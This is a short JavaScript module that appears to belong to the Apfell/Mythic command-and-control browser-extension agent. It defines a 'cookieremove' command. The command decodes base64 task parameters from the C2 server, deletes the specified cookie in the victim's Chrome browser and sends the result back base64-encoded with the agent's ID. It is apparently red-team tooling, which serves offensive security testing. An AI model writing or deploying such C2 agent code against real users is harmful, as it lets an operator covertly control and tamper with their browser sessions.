cookieremove = function(task) {
    let details = JSON.parse(atob(task.parameters.toString()));
    chrome.cookies.remove(details, function(cookie){
        let resp;
        if (cookie === null) {
            resp = JSON.stringify(chrome.runtime.lastError);
        } else {
            resp = JSON.stringify(cookie, null, 2);
        }
        let response = {'task_id':task.id, 'user_output':resp, 'completed':true};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    });

};


C2.commands[cookieremove.name] = cookieremove;
COMMAND_ENDS_HERE
